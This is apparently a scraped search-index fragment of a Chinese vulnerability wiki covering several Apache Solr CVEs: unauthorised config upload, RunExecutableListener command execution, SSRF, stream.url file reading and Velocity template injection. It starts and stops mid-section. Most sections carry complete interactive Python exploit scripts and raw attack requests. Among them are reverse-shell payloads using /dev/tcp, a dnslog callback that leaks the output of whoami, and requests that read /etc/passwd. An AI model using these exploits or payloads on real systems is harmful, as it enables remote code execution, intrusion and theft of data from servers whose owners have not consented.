\"Content-Type:application/octet-stream\" --data-binary @vuln.zip \"http://xxx.xxx.xxx.xxx:8983/solr/admin/configs?action=UPLOAD\u0026name=vuln\" n****ame参数为压缩包的文件名 利用漏洞创建一个 core curl \"http://xxx.xxx.xxx.xxx:8983/solr/admin/collections?action=CREATE\u0026name=peiqi\u0026numShards=1\u0026replicationFactor=1\u0026wt=xml\u0026collection.configName=vuln\" name参数为创建的core核心名 collection.configName参数为上传的文件名 查看core列表，发现已经成功创建 再使用 Apache Solr Velocity模板远程执行 CVE-2019-17558 即可执行任意命令 POC使用详情参考另一篇复现文章 ","date":"0001-01-01","objectID":"/apache-solr-rce-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2020-13957/:4:0","tags":null,"title":"","uri":"/apache-solr-rce-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2020-13957/"},{"categories":null,"content":"漏洞POC 使用前按复现步骤上传对应版本的zip文件，例如我这里上传的文件为 qwert.zip,其他使用方法与 Apache Solr Velocity模板远程执行 CVE-2019-17558 的POC使用方法类似 #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import re import sys import os import json def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: Apache Solr 6.6.0 -6.6.5 \\033[0m') print('+ \\033[34m Apache Solr 7.0.0 -7.7.3 \\033[0m') print('+ \\033[34m Apache Solr 8.0.0 -8.6.2 \\033[0m') print('+ \\033[36m使用格式: python3 cve-2020-13957.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mZip \u003e\u003e\u003e vuln.zip(Zip文件名) \\033[0m') print('+------------------------------------------') def POC_1(target_url, file_name): core_name = str(input(\"\\033[35mPlease input Create Core Name\\nCore \u003e\u003e\u003e \\033[0m\")) core_update = \"\"\"%s/solr/admin/collections?action=CREATE\u0026name=%s\u0026numShards=1\u0026replicationFactor=1\u0026wt=xml\u0026collection.configName=%s\"\"\" % (target_url, core_name, file_name.replace(\".zip\",\"\")) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } response = requests.get(url=core_update, headers=headers, timeout=30) if response.status_code != 200: print(\"\\033[31m[x] 创建Core失败 \\033[0m\") sys.exit(0) else: core = re.findall(r'\u003cstr name=\"core\"\u003e(.*?)\u003c/str\u003e',response.text)[0] vuln_url = target_url + \"/solr/\" + core + \"/config\" print(\"\\033[32m[o] 成功获得core_name,Url为：\" + target_url + \"/solr/\" + core + \"/config\\033[0m\") return vuln_url,core def POC_2(target_url, core): open_params = target_url + \"/solr/\" + core + \"/config\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } set_api_data = \"\"\" { \"update-queryresponsewriter\": { \"startup\": \"lazy\", \"name\": \"velocity\", \"class\": \"solr.VelocityResponseWriter\", \"template.base.dir\": \"\", \"solr.resource.loader.enabled\": \"true\", \"params.resource.loader.enabled\": \"true\" } } \"\"\" response = requests.request(\"POST\", url=open_params, data=set_api_data, headers=headers, timeout=10) if response.status_code == 200: print(\"\\033[32m[o] POST请求成功将params.resource.loader.enabled设置为True \\033[0m\") else: print(\"\\033[31m[x] POST请求params.resource.loader.enabled设置为True失败 \\033[0m\") sys.exit(0) def POC_3(target_url, core, cmd): vuln_url = target_url + \"/solr/\" + core + \"/select?q=1\u0026\u0026wt=velocity\u0026v.template=custom\u0026v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27\" + cmd + \"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests.request(\"GET\", url=vuln_url, headers=headers, timeout=10) if \"Error 500\" in response.text: print(\"\\033[31m[x] 代码执行失败，响应为 Error 500 \\033[0m\") else: print(\"\\033[32m[o] 漏洞成功利用,响应为\\n \\033[0m\",response.text) def POC_4(target_url, core, IP, PORT): # POC : /bin/bash -c $@|bash 0 echo bash -i \u003e\u0026/dev/tcp/xxx.xxx.xxx.xxx:9999 0\u003e\u00261 cmd = \"%2Fbin%2Fbash%20-c%20%24%40%7Cbash%200%20echo%20bash%20-i%20%3E%26%2Fdev%2Ftcp%2F{}%2F{}%200%3E%261\".format(IP, PORT) vnul_url = target_url + \"/solr/\" + core + \"/select?q=1\u0026\u0026wt=velocity\u0026v.template=custom\u0026v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getR","date":"0001-01-01","objectID":"/apache-solr-rce-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2020-13957/:5:0","tags":null,"title":"","uri":"/apache-solr-rce-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2020-13957/"},{"categories":null,"content":"Apache Solr RCE 远程命令执行漏洞 CVE-2017-12629 ","date":"0001-01-01","objectID":"/apache-solr-rce-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-12629/:0:0","tags":null,"title":"","uri":"/apache-solr-rce-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-12629/"},{"categories":null,"content":"漏洞描述 Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。原理大致是文档通过Http利用XML加到一个搜索集合中。查询该集合也是通过 http收到一个XML/JSON响应来实现。此次7.1.0之前版本总共爆出两个漏洞：XML实体扩展漏洞（XXE） 和远程命令执行漏洞（RCE），二者可以连接成利用链，编号均为CVE-2017-12629。 ","date":"0001-01-01","objectID":"/apache-solr-rce-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-12629/:1:0","tags":null,"title":"","uri":"/apache-solr-rce-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-12629/"},{"categories":null,"content":"漏洞影响 Apache Solr \u003c 7.1 ","date":"0001-01-01","objectID":"/apache-solr-rce-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-12629/:2:0","tags":null,"title":"","uri":"/apache-solr-rce-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-12629/"},{"categories":null,"content":"环境搭建 https://github.com/vulhub/vulhub.git cd vulhub/solr/CVE-2017-12629 docker-compose build docker-compose up -d ","date":"0001-01-01","objectID":"/apache-solr-rce-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-12629/:3:0","tags":null,"title":"","uri":"/apache-solr-rce-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-12629/"},{"categories":null,"content":"漏洞复现 先请求url地址获取 core 内容 http://xxx.xxx.xxx.xxx:8983/solr/admin/cores 通过查看代码，能够触发命令执行的事件有两个：postCommit 和 newSearcher 第一个请求包用于载入缓存中 exe : ping 执行的命令 dir: 命令存在的目录位置 args:命令参数 如下请求包执行的是 /bin/ping 1.1.1.1 POST /solr/demo/config HTTP/1.1 Host: xxx.xxx.xxx.xxx:8983 Connection: close Content-Type: application/json Content-Length: 198 { \"add-listener\" : { \"event\":\"postCommit\", \"name\":\"newlistener-1\", \"class\":\"solr.RunExecutableListener\", \"exe\":\"ping\", \"dir\":\"/bin/\", \"args\":[\"1.1.1.1\"] } } 第二个请求包用于更新缓存并执行命令 POST /solr/demo/update HTTP/1.1 Host: xxx.xxx.xxx.xxx:8983 Connection: close Content-Type: application/json Content-Length: 198 [{\"id\":\"test\"}] 注意 第一个请求包的这个位置 “name”:“newlistener-1”,listerer的名字需要替换 例如第一次 为 newlistener-1 ，第二次则需要改为 newlistener-2 注意 第二个请求包的这个位置 [{“id”:“test”}]，同第一个请求包的name，每执行一次就需要更换 id ,例如第一次 为 test ，第二次则需要改为 tset-2 注意 Content-Type: application/json 需要添加 不更改执行发生报错示例 进入docker容器查看发现命令已经执行 使用 newSearcher可以直接加载入缓存执行命令 请求包如下 POST /solr/demo/config HTTP/1.1 Host: xxx.xxx.xxx.xxx:8983 Connection: close Content-Type: application/json Content-Length: 198 { \"add-listener\" : { \"event\":\"newSearcher\", \"name\":\"newlistener-2\", \"class\":\"solr.RunExecutableListener\", \"exe\":\"bash\", \"dir\":\"/bin/\", \"args\":[ \"-c\", \"mkdir /tmp/vuln\", ] } } 注意点同上，也需要每次执行更改 “name”:“newlistener-2” 的参数 成功执行了创建文件的命令 如果想要执行其他命令,则需要命令的的位置，例如执行ping，则需要设置dir参数为 /usr/bin/ping 或者 /bin/ping，如果需要检测漏洞是否存在则可以使用 dnslog来检测 ","date":"0001-01-01","objectID":"/apache-solr-rce-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-12629/:4:0","tags":null,"title":"","uri":"/apache-solr-rce-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-12629/"},{"categories":null,"content":"漏洞利用POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json import random def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: Apache Solr \u003c 7.1 \\033[0m') print('+ \\033[36m使用格式: python3 cve-2017-12629.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mcmd \u003e\u003e\u003e dnslog地址(漏洞外连检测) \\033[0m') print('+ \\033[36mCmd \u003e\u003e\u003e shell(反弹shell) \\033[0m') print('+------------------------------------------') def POC_1(target_url): core_url = target_url + \"/solr/admin/cores?indexInfo=false\u0026wt=json\" try: response = requests.request(\"GET\", url=core_url, timeout=10) core_name = list(json.loads(response.text)[\"status\"])[0] print(\"\\033[32m[o] 成功获得core_name,Url为：\" + target_url + \"/solr/\" + core_name + \"/config\\033[0m\") return core_name except: print(\"\\033[31m[x] 目标Url漏洞利用失败\\033[0m\") sys.exit(0) def POC_2(target_url, core_name, dnslog_url, n): exp_url = target_url + \"/solr/\" + core_name + \"/config\" dnslog_url = \"`whoami`.\" + dnslog_url headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } payload_cmd = \"\"\" {\"add-listener\":{\"event\":\"postCommit\",\"name\":\"newSearche-%s\",\"class\":\"solr.RunExecutableListener\",\"exe\":\"curl\",\"dir\":\"/usr/bin/\",\"args\":[\"%s\"]}} \"\"\" % (n, dnslog_url) response = requests.request(\"POST\", url=exp_url, headers=headers, data=payload_cmd, timeout=30) if \"add-listener\" in response.text: print(\"\\033[32m[o] 成功执行，请查看dnslog \\033[0m\") else: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") def POC_3(target_url, core_name, n, ip, port): exp_url = target_url + \"/solr/\" + core_name + \"/config\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } payload_cmd = \"\"\" {\"add-listener\":{\"event\":\"postCommit\",\"name\":\"newSearche-%s\",\"class\":\"solr.RunExecutableListener\",\"exe\":\"sh\",\"dir\":\"/bin/\",\"args\":[\"-c\",\"bash -i \u003e\u0026 /dev/tcp/%s/%s 0\u003e\u00261\"]}} \"\"\" % (n, ip, port) response = requests.request(\"POST\", url=exp_url, headers=headers, data=payload_cmd, timeout=30) if \"add-listener\" in response.text: print(\"\\033[32m[o] 成功执行 \\033[0m\") else: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) core_name = POC_1(target_url) while True: n = random.randint(1, 9999) cmd = input(\"\\033[35mCmd \u003e\u003e\u003e \\033[0m\") if cmd == \"exit\": exit(0) elif cmd == \"shell\": IP = str(input(\"\\033[35m请输入监听IP \u003e\u003e\u003e \\033[0m\")) PORT = str(input(\"\\033[35m请输入监听PORT \u003e\u003e\u003e \\033[0m\")) POC_3(target_url, core_name, n, IP, PORT) elif cmd == \"dnslog\": dnslog_url = str(input('\\033[35m请输入你的dnslog地址：\\033[0m')) POC_2(target_url, core_name, dnslog_url, n) 如果shell或dnslog无反应，可以选择更改一下POC的部分参数执行需要的代码 ","date":"0001-01-01","objectID":"/apache-solr-rce-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-12629/:5:0","tags":null,"title":"","uri":"/apache-solr-rce-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-12629/"},{"categories":null,"content":"参考文章 Apache Solr远程代码执行漏洞（CVE-2017-12629）从利用到入侵检测 cve-2017-12629 apache solr xxe \u0026 rce 漏洞分析 ","date":"0001-01-01","objectID":"/apache-solr-rce-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-12629/:6:0","tags":null,"title":"","uri":"/apache-solr-rce-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-12629/"},{"categories":null,"content":"Apache Solr Replication handler SSRF CVE-2021-27905 ","date":"0001-01-01","objectID":"/apache-solr-replication-handler-ssrf-cve-2021-27905/:0:0","tags":null,"title":"","uri":"/apache-solr-replication-handler-ssrf-cve-2021-27905/"},{"categories":null,"content":"漏洞描述 Apache Solr是一个开源搜索服务引擎，Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。漏洞产生在 ReplicationHandler 中的 masterUrl 参数（ leaderUrl 参数）可指派另一个 Solr 核心上的 ReplicationHandler 讲索引数据复制到本地核心上。成功利用此漏洞可造成服务端请求伪造漏洞。 参考链接： https://nvd.nist.gov/vuln/detail/CVE-2021-27905 ","date":"0001-01-01","objectID":"/apache-solr-replication-handler-ssrf-cve-2021-27905/:1:0","tags":null,"title":"","uri":"/apache-solr-replication-handler-ssrf-cve-2021-27905/"},{"categories":null,"content":"漏洞影响 Apache Solr 7.0.0 - 7.7.3 Apache Solr 8.0.0 - 8.8.1 ","date":"0001-01-01","objectID":"/apache-solr-replication-handler-ssrf-cve-2021-27905/:2:0","tags":null,"title":"","uri":"/apache-solr-replication-handler-ssrf-cve-2021-27905/"},{"categories":null,"content":"漏洞复现 poc： GET /solr/test/replication?command=fetchindex\u0026masterUrl=http://127.0.0.1/\u0026wt=json\u0026httpBasicAuthUser=\u0026httpBasicAuthPassword= HTTP/1.1 HOST:target .... GET http://xxxxx/solr/xxxx/debug/dump?stream.url=file:///etc/passwd\u0026param=ContentStream HTTP/1.1 HOST:target ... ","date":"0001-01-01","objectID":"/apache-solr-replication-handler-ssrf-cve-2021-27905/:2:1","tags":null,"title":"","uri":"/apache-solr-replication-handler-ssrf-cve-2021-27905/"},{"categories":null,"content":"Apache Solr stream.url 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/apache-solr-stream.url-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/apache-solr-stream.url-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Apache Solr 存在任意文件读取漏洞，攻击者可以在未授权的情况下获取目标服务器敏感文件。 参考链接： Apache Solr 组件安全概览 https://mp.weixin.qq.com/s/3WuWUGO61gM0dBpwqTfenQ https://mp.weixin.qq.com/s/HMtAz6_unM1PrjfAzfwCUQ ","date":"0001-01-01","objectID":"/apache-solr-stream.url-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/apache-solr-stream.url-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Apache Solr \u003c= 8.8.1 ","date":"0001-01-01","objectID":"/apache-solr-stream.url-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/apache-solr-stream.url-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"Solr Admin\" ","date":"0001-01-01","objectID":"/apache-solr-stream.url-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/apache-solr-stream.url-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 访问 Solr Admin 管理员页面 获取core的信息 http://xxx.xxx.xxx.xxx/solr/admin/cores?indexInfo=false\u0026wt=json 发送请求 请求包如下 POST /solr/ckan/config HTTP/1.1 Host: xxx.xxx.xxx:8983 Content-Length: 99 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://118.31.46.134:8983 Content-Type: application/json User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://118.31.46.134:8983/solr/ckan/config Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Connection: close {\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":true},\"olrkzv64tv\":\"=\"} 再进行文件读取 请求包如下 POST /solr/ckan/debug/dump?param=ContentStreams HTTP/1.1 Host: xxx.xxx.xxx.xxx:8983 Content-Length: 29 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36 Origin: http://118.31.46.134:8983 Content-Type: application/x-www-form-urlencoded Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://118.31.46.134:8983/solr/ckan/config Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Connection: close stream.url=file:///etc/passwd Curl请求为 curl -d '{\"set-property\" : {\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}' http://xxx.xxx.xxx.xxx:8983/solr/{corename}/config -H 'Content-type:application/json' curl \"http://xxx.xxx.xxx.xxx:8983/solr/db/debug/dump?param=ContentStreams\" -F \"stream.url=file://etc/passwd\" ","date":"0001-01-01","objectID":"/apache-solr-stream.url-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/apache-solr-stream.url-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞POC poc1： POC还是建立在未授权访问的情况下 import requests import sys import random import re import base64 import time from lxml import etree import json from requests.packages.urllib3.exceptions import InsecureRequestWarning def POC_1(target_url): core_url = target_url + \"/solr/admin/cores?indexInfo=false\u0026wt=json\" try: response = requests.request(\"GET\", url=core_url, timeout=10) core_name = list(json.loads(response.text)[\"status\"])[0] print(\"\\033[32m[o] 成功获得core_name,Url为：\" + target_url + \"/solr/\" + core_name + \"/config\\033[0m\") return core_name except: print(\"\\033[31m[x] 目标Url漏洞利用失败\\033[0m\") sys.exit(0) def POC_2(target_url, core_name): vuln_url = target_url + \"/solr/\" + core_name + \"/config\" headers = { \"Content-type\":\"application/json\" } data = '{\"set-property\" : {\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}' try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 正在准备文件读取...... \\033[0m\".format(target_url)) if \"This\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {} 可能存在漏洞 \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] 目标 {} 不存在漏洞\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_3(target_url, core_name, File_name): vuln_url = target_url + \"/solr/{}/debug/dump?param=ContentStreams\".format(core_name) headers = { \"Content-Type\": \"application/x-www-form-urlencoded\" } data = 'stream.url=file://{}'.format(File_name) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) if \"No such file or directory\" in response.text: print(\"\\033[31m[x] 读取{}失败 \\033[0m\".format(File_name)) else: print(\"\\033[36m[o] 响应为:\\n{} \\033[0m\".format(json.loads(response.text)[\"streams\"][0][\"stream\"])) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) core_name = POC_1(target_url) POC_2(target_url, core_name) while True: File_name = str(input(\"\\033[35mFile \u003e\u003e\u003e \\033[0m\")) POC_3(target_url, core_name, File_name) poc2： #!/usr/bin/python # coding: UTF-8 import requests host=\"http://192.168.1.79:8081/\" if host[-1]=='/': host=host[:-1] def get_core(host): url=host+'/solr/admin/cores?indexInfo=false\u0026wt=json' core_data=requests.get(url,timeout=3).json() if core_data['status']: core=core_data['status'].keys()[0] jsonp_data={\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":'true'}} requests.post(url=host+\"/solr/%s/config\"%core,json=jsonp_data) result_data=requests.post(url=host+'/solr/%s/debug/dump?param=ContentStreams'%core,data={\"stream.url\":\"file:///etc/passwd\"}).json() if result_data['streams']: print result_data['streams'][0]['stream'] else: exit(\"不存在此漏洞\") get_core(host) ","date":"0001-01-01","objectID":"/apache-solr-stream.url-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:5:0","tags":null,"title":"","uri":"/apache-solr-stream.url-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Apache Solr Velocity模板远程执行 CVE-2019-17558 ","date":"0001-01-01","objectID":"/apache-solr-velocity%E6%A8%A1%E6%9D%BF%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C-cve-2019-17558/:0:0","tags":null,"title":"","uri":"/apache-solr-velocity%E6%A8%A1%E6%9D%BF%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C-cve-2019-17558/"},{"categories":null,"content":"漏洞描述 2019年10月末，GitHub代码中安全研究员S00pY发布一个Apache Solr Velocity模版注入远程命令执行的POC，发现网络上出现针对Apache Solr服务器的远程代码执行漏洞。该漏洞是由于Velocity模板存在注入所致（Velocity是一个基于Java的模板引擎，可让使用者通过模板语言引用Java中定义的对象）。攻击者在知道Solr服务器上Core名称后，先把params.resource.loader.enabled设置为true（就可加载指定资源），再进行远程执行命令。 ","date":"0001-01-01","objectID":"/apache-solr-velocity%E6%A8%A1%E6%9D%BF%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C-cve-2019-17558/:1:0","tags":null,"title":"","uri":"/apache-solr-velocity%E6%A8%A1%E6%9D%BF%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C-cve-2019-17558/"},{"categories":null,"content":"漏洞影响 Apache Solr 5.x 至 8.2.0 ","date":"0001-01-01","objectID":"/apache-solr-velocity%E6%A8%A1%E6%9D%BF%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C-cve-2019-17558/:2:0","tags":null,"title":"","uri":"/apache-solr-velocity%E6%A8%A1%E6%9D%BF%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C-cve-2019-17558/"},{"categories":null,"content":"环境搭建 https://github.com/vulhub/vulhub.git cd vulhub/solr/CVE-2019-17558 docker-compose build docker-compose up -d # 创建一个solr核心test docker-compose exec solr bash bin/solr create_core -c test -d example/example-DIH/solr/db 访问 http://xxx.xxx.xxx.xxx:8983/solr/ 正常即可 ","date":"0001-01-01","objectID":"/apache-solr-velocity%E6%A8%A1%E6%9D%BF%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C-cve-2019-17558/:3:0","tags":null,"title":"","uri":"/apache-solr-velocity%E6%A8%A1%E6%9D%BF%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C-cve-2019-17558/"},{"categories":null,"content":"漏洞复现 打开后获取 Core 信息 得知 test 这个 Core 存在 访问 http://xxx.xxx.xxx.xxx:8983/solr/test/config 正常 访问Core的config配置信息时，通过POST请求把{% em type=“red” %}params.resource.loader.enabled{% endem %}设置为 True，再通过精心构造的get请求即可RCE，此时用户就可以加载指定资源，构造一个能执行命令的恶意请求 设置params.resource.loader.enabled为True POST /solr/test/config HTTP/1.1 Host: xxx.xxx.xxx.xxx:8983 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Connection: close Content-Length: 259 { \"update-queryresponsewriter\": { \"startup\": \"lazy\", \"name\": \"velocity\", \"class\": \"solr.VelocityResponseWriter\", \"template.base.dir\": \"\", \"solr.resource.loader.enabled\": \"true\", \"params.resource.loader.enabled\": \"true\" } } 命令执行 再使用POC造成命令执行 http://xxx.xxx.xxx.xxx:8983/solr/test/select?q=1\u0026\u0026wt=velocity\u0026v.template=custom\u0026v.template.custom=%23set($x=\"\")+%23set($rt=$x.class.forName(\"java.lang.Runtime\"))+%23set($chr=$x.class.forName('java.lang.Character'))+%23set($str=$x.class.forName(\"java.lang.String\"))+%23set($ex=$rt.getRuntime().exec(\"whoami\"))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end 反弹hell，因为部分命令会被过滤导致返回 Error 500 ，所以反弹shell需要用另外的反弹shell方法 POC : /bin/bash -c $@|bash 0 echo bash -i \u003e\u0026 /dev/tcp/xxx.xxx.xxx.xxx:9999 0\u003e\u00261 POC需要Urlencoding进行编码才能绕过 POC ： 